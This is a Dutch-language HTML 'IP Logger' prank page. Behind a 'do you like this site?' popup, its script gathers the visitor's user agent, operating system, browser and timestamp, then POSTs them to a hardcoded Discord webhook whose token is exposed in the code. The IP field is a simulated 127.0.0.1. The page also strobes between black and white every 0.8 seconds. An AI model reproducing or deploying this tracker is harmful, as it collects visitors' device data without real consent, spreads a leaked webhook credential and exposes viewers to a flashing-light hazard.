<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 50px;
            background-color: white;
            color: black;
            animation: changeBackground 0.8s infinite;
            position: relative;
        }
        h1 {
            color: inherit;
        }
        p {
            color: inherit;
            margin-bottom: 40px;
        }
        #popup {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        #popup-content {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            max-width: 80%;
        }
        #popup-content p {
            margin-bottom: 10px;
        }
        #popup-content button {
            padding: 10px 20px;
            border: none;
            cursor: pointer;
        }
        @keyframes changeBackground {
            0% { background-color: white; color: black; }
            50% { background-color: black; color: white; }
            100% { background-color: white; color: black; }
        }
    </style>
    <script>
        function startMusic() {
            hidePopup();
            var audio = new Audio('sound.mp3');
            audio.play();
            sendToDiscord();
        }

        function hidePopup() {
            var popup = document.getElementById('popup');
            popup.style.display = 'none';
        }

        function sendToDiscord() {
            var ipAddress = "127.0.0.1"; // Simulated IP address for demonstration
            var userAgent = navigator.userAgent;
            var timestamp = new Date().toISOString();
            var os = detectOS(userAgent);
            var browser = detectBrowser(userAgent);
            var webhookURL = 'https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP';

            var embed = {
                "embeds": [
                    {
                        "title": "IP Logger",
                        "description": "Een gebruiker heeft de pagina bezocht.",
                        "color": 16711680, // Rood
                        "fields": [
                            {
                                "name": "IP Adres",
                                "value": ipAddress,
                                "inline": true
                            },
                            {
                                "name": "Besturingssysteem",
                                "value": os,
                                "inline": true
                            },
                            {
                                "name": "Browser",
                                "value": browser,
                                "inline": true
                            },
                            {
                                "name": "Gebruikersagent",
                                "value": userAgent,
                                "inline": false
                            },
                            {
                                "name": "Tijdstip",
                                "value": timestamp,
                                "inline": true
                            }
                        ]
                    }
                ]
            };

            var xhr = new XMLHttpRequest();
            xhr.open("POST", webhookURL);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify(embed));
        }

        function detectOS(userAgent) {
            var OSes = [
                'Windows',
                'Mac OS',
                'Linux',
                'iOS',
                'Android'
            ];

            var detectedOS = OSes.find(function(os) {
                return userAgent.indexOf(os) >= 0;
            });

            return detectedOS || 'Onbekend';
        }

        function detectBrowser(userAgent) {
            var browsers = [
                'Chrome',
                'Firefox',
                'Safari',
                'Edge',
                'Opera'
            ];

            var detectedBrowser = browsers.find(function(browser) {
                return userAgent.indexOf(browser) >= 0;
            });

            return detectedBrowser || 'Onbekend';
        }

        window.onload = function() {
            var popup = document.getElementById('popup');
            popup.addEventListener('click', function() {
                startMusic();
            });
        }
    </script>
</head>
<body>
    <h1>Welkom bij onze geweldige site!</h1>
    <p>Geniet van de muziek terwijl we uw IP-adres loggen.</p>
    <div id="popup">
        <div id="popup-content">
            <p>Vind je deze site leuk?</p>
            <button onclick="startMusic()">Ja</button>
            <button onclick="hidePopup()">Nee</button>
        </div>
    </div>
    <audio id="music" autoplay loop>
        <source src="sound.mp3" type="audio/mpeg">
        Your browser does not support the audio element.
    </audio>
</body>
</html>
